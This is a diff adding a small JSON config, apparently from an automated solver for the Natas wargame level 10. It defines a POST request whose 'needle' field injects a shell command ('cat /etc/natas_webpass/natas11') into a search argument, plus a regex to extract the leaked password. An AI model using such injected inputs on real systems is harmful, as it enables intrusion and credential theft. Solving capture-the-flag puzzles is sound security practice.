@@ -1,0 +1,10 @@
+{
+    "hint":"reverse engineering => see this file: src/natasMethods/natas11.js",
+    "findedByRegexInContent":"\\s[a-zA-Z0-9]{32}",
+    "method":"POST",
+    "isFormData": true,
+    "body":{
+        "needle": ".* cat /etc/natas_webpass/natas11 #",
+        "submit":"1"
+    }
+}
